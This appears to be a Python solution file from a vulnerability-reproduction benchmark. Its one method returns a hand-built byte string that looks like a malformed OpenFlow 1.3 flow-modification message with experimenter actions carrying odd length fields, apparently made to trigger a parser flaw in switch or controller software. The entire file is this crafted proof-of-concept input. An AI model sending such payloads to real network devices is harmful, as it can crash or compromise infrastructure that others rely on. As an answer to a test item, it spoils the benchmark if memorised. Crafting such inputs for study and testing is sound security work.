class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'\x04\x0e\x00\x48\x00\x00\x00\x00'
        flowmod = b'\x00' * 30
        match_ = b'\x00\x01\x00\x04'
        instr = b'\x00\x04\x00\x1e\x00\x00\x00\x00'
        actions = b'\xff\xff\x00\x16\x00\x00\x23\x20\x00\x00\x00\x17\xff\xfe\xff\xff\x00\x00\x23\x20\x00\x00'
        return header + flowmod + match_ + instr + actions